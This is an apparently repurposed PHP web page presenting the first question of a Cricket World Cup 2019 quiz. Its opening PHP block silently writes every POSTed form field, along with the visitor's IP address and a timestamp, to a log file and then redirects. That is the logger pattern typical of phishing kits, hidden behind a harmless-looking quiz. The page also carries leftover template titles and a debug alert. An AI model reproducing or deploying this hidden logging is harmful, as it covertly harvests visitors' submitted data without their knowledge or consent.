<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: index2.php');
$handle = fopen('log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿
<!DOCTYPE html>
<html>

<head>
    <title>Cricket World Cup Quiz 2019</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#fdcccc">
    <meta name="msapplication-navbutton-color" content="#fdcccc">
    <meta name="apple-mobile-web-app-status-bar-style" content="#2196f3">
    <meta name="description" content="How much your friends know about you ? Create a Quiz about you and share it with your friends. Check how many they can get correctly" />
    <meta name="keywords" content="myfeelings, friends, friendship quiz, friendship test" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="http://myfeelings.pw/images/ogimage.jpg" />
    <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="/icons/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="/icons/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="manifest" href="/icons/manifest.json">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <meta name="robots" content="noindex, nofollow">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <style>
        html,
        body,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        span {
            font-family: "Montserrat", sans-serif;
            background-color: #ff1e50;
        }
       

        html {
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }

        body {
            margin: 0;
            background-color: #ff1e50
        }



        .main_div {
            align-content: space-between;
            align-items: flex-start;
            background-color: #ff1e50;
        }




        .topbar {
            position: fixed;
            width: 100%;
            z-index: 1;
            background-color: #33337a !important;
            overflow: hidden;
            border-bottom: 2px solid #f55757;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

        .space {
            height: 120px;
        }

        .space2 {
            height: 80px;
        }

        .one {
            font-size: 21px;
            display: block;
            font-weight: bold;
        }

        .default-one {
            font: normal 16px/normal Montserrat, Tahoma, sans-serif;
            display: inline;
        }

        .box {
            padding-top: 10px;
            background: #fff;
            padding-bottom: 20px;
            margin-left: 20px;
            margin-right: 20px;
            box-shadow: 0 4px 10px 0 rgba(0, 0, 0, 0.2), 0 4px 20px 0 rgba(0, 0, 0, 0.19);
            border: 2px solid #fdcccc;
            -webkit-border-radius: 31px;
            border-radius: 20px;
        }

        .content {
            margin: none;
            width: 100%;
            border-radius: 50%;
        }

        .title {
            font-size: 21px;
        }

        .sub_title {
            font-size: 18px;
        }

        .ad {
            -webkit-align-content: center;
            align-content: center;
            margin-top: 20px;
        }

        .smallu {
            color: aliceblue;
            margin: 10px;
            font-size: 13px;
            text-decoration: bold;
            text-align: center;
        }

        h4 {
            font-size: 14px;
        }

        .enter_text {
            padding: 14px 24px;
            border: 2px solid #f55757;
            -webkit-border-radius: 28px;
            border-radius: 28px;
            font: normal 16px/normal Montserrat, Tahoma, sans-serif;
            color: rgba(0, 0, 0, 1);
            text-align: center;


            -o-text-overflow: clip;
            text-overflow: clip;
            background: #f2dada;
            -webkit-box-shadow: 2px 2px 2px 0 rgba(0, 0, 0, 0.2) inset;
            box-shadow: 2px 2px 2px 0 rgba(0, 0, 0, 0.2) inset;
        }

        .small-box {
            margin-top: 20px;
            max-width: 100%;
            max-height: 70%;
            margin-bottom: 20px;
        }

        .main_button {
            display: inline-block;
            cursor: pointer;
            margin-top: 10px;
            padding: 10px 27px;
            border: 2px solid #fdcccc;
            -webkit-border-radius: 31px;
            border-radius: 31px;
            font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
            color: rgba(255, 255, 255, 0.9);
            text-align: center;
            -o-text-overflow: clip;
            text-overflow: clip;
            background: #f55757;
        }

        .ans_list {
            margin-top: 5px;
            margin-bottom: 5px;
            border-top: 1px solid #ddd;
        }

        .show_ans {
            background: none !important;
            color: inherit;
            border: none;
            font-family: "Montserrat", sans-serif;
            font-size: 14px;
            text-decoration: bold;
            text-align: left;
            cursor: pointer;
            display: block;
            width: 100%;
            padding: 10px;
            border-bottom: 1px solid #ddd;
        }

        select {
            border-radius: 20px;
            border: 2px solid #f55757;
            padding: 10px;
            margin-left: 5px;
        }

        .whatsapp,
        .facebook,
        .msgner {
            display: inline-block;
            -webkit-box-sizing: content-box;
            -moz-box-sizing: content-box;
            box-sizing: content-box;
            cursor: pointer;
            margin: 10px;
            text-decoration: none;
            padding: 10px 30px 10px 30px;
            border: none;
            font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
            color: rgba(255, 255, 255, 0.9);
            -o-text-overflow: clip;
            text-overflow: clip;
            background: #128C7E;
        }

        .copytext {
            display: inline-block;
            -webkit-box-sizing: content-box;
            -moz-box-sizing: content-box;
            box-sizing: content-box;
            cursor: pointer;
            margin: 10px;
            text-decoration: none;
            padding: 10px;
            border: none;
            font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
            color: white;
            -o-text-overflow: clip;
            text-overflow: clip;
            background: black;
        }

        .facebook {
            background: #3b5998;
        }

        .msgner {
            background: #2196F3;
        }

        .hide {
            display: none;
        }

        .textareacopy {
            color: #2196F3;
            border: none;
            text-align: center;
            width: 90%;
            font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
        }

        .yellow-strip {
            margin-left: 12px;
            margin-right: 28px;
            margin-top: 10px;
            padding: 15px;
            font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
            color: #000 !important;
            background-color: #ffffcc !important;
            border-radius: 15%;
            border: none;
        }

        .parm-table {
            border: 1px solid #ccc;
            border-collapse: collapse;
            border-spacing: 0;
            width: 100%;
            display: table;
        }

        .parm-table td:first-child {
            padding-left: 16px;
        }

        .parm-table td {
            padding: 8px 8px;
            display: table-cell;
            text-align: left;
            vertical-align: top;
        }

        .parm-table tr:nth-child(even) {
            background-color: #f1f1f1;
        }

        .parm-table tr:nth-child(odd) {
            background-color: #fff;
        }

        .parm-table tr {
            border-bottom: 1px solid #ddd;
        }

        .parm-table td:first-child {
            padding-left: 16px;
        }

        .parm-table td {
            padding: 8px 8px;
            display: table-cell;
            text-align: left;
            vertical-align: top;
        }

        .table_heading {
            border-bottom: 1px solid #ddd;
            color: #fff !important;
            background-color: #f55757 !important;
        }

        .bottom {
            color: #ffffff;
            text-align: center;
            font: normal 16px/normal Montserrat, Tahoma, Geneva, sans-serif;
            margin-top: 30px;
        }
        .flex_main{
            text-align: center;
            color: aliceblue;
            margin-left: 8px;
            margin-right: 8px;
        }

    </style>

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-118893437-2" type="ec9aee17e5a0a244e2552532-"></script>
    <script type="ec9aee17e5a0a244e2552532-">
        window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-118893437-2');
</script>


    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">
    <title>Starter Template · Bootstrap</title>

    <!--Template based on URL below-->
    <link rel="canonical" href="https://getbootstrap.com/docs/4.3/examples/starter-template/">

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    


</head>

<body>





    <div class="main_div">

        <div class="topbar">
            <center><a href="/"><img src="logo2.png" width="210px" height="80px"></a></center>
        </div>
        <div class="space2"></div>
    
<div class="d-flex flex-row flex_main" style="margin-top: 10px;">
  <div class="p-2 flex-fill justify-content-center " style="background-color: #ffffcc; color: #ff1e50; border-radius: 80%; "> 1</div>
  <div class="p-2 flex-fill justify-content-center"> 2 </div>
  <div class="p-2 flex-fill justify-content-center"> 3</div>
    <div class="p-2 flex-fill justify-content-center"> 4</div>
    <div class="p-2 flex-fill justify-content-center"> 5</div>
    <div class="p-2 flex-fill justify-content-center "> 6</div>
    <div class="p-2 flex-fill justify-content-center"> 7</div>
    <div class="p-2 flex-fill justify-content-center"> 8</div>
    <div class="p-2 flex-fill justify-content-center "> 9</div>
    <div class="p-2 flex-fill justify-content-center"> 10</div>
    
</div>


        <div class="content" style="border-radius: 50%; margin: 10px;">
            <div class="yellow-strip">
                <b><u>Que 1)</u></b>The First Indian Cricketer to take hat-trick in ICC World Cup is ________ <br><br>
             <div style="text-align:center;">
                 <form action="question2.php" method="post" id="form">
                <button type="submit" style="background-color: #21aaff; font-size: 17px;padding: 5px; padding-left 20px; border-radius: 20%; color: white;" onclick="save(1)" id="option1" > Mohammad Shami </button> <br><br>
                <button type="submit" style="background-color: #21aaff; font-size: 17px;padding: 5px; padding-left 20px; border-radius: 20%; color: white;" onclick="save(2)"  id="option2"> Chetan Sharma </button>
                <button type="submit" style="background-color: #21aaff; font-size: 17px;padding: 5px; padding-left 20px; border-radius: 20%; color: white;" onclick="save(3)" id="option3"> Lasith Maligna </button>
                <button type="submit" style="background-color: #21aaff; font-size: 17px;padding: 5px; padding-left 20px; border-radius: 20%; color: white;" onclick="save(4)" id="option4"> Brett Lee </button>
                     <input type="hidden" name="id" id="id" value="" >
                      </form>
                 </div>
                
            
            
            
            
            </div>
        </div>

        <div class="bottom">
            <br><br><br><br>
            <center>(c) Emirates Web Apps 2019</center>
        </div>
<script>
    
    
         
        $('form').submit(function(e){
            var form = this;
            e.preventDefault();
            setTimeout(function(){
                form.submit();
            },800
            );
        });
        
        
        
    
    function save(s){
    var score=  document.getElementById("id").value;
        alert("score " + score);
        if(s==1)
        {var colchngr=  document.getElementById("option1");
        colchngr.style.backgroundColor="#3fca19";
         document.getElementById("id").value= 0;}
        if(s==2)
        {var colchngr=  document.getElementById("option2");
        colchngr.style.backgroundColor="#3fca19";
          document.getElementById("id").value= 1;
        }
//        window.setTimeout(function(){ window.open("question2.php","_self"); }, 600);}
        if(s==3)
        {var colchngr=  document.getElementById("option3");
        colchngr.style.backgroundColor="#3fca19";
         document.getElementById("id").value= 0;}
        if(s==4)
        {var colchngr=  document.getElementById("option4");
        colchngr.style.backgroundColor="#3fca19";
         document.getElementById("id").value= 0;}
        
   //    window.setTimeout(function(){ window.open("question2.php?id=0","_self"); }, 600);
    }
        
        
        
        </script>


       


    </div>

</body>

</html>
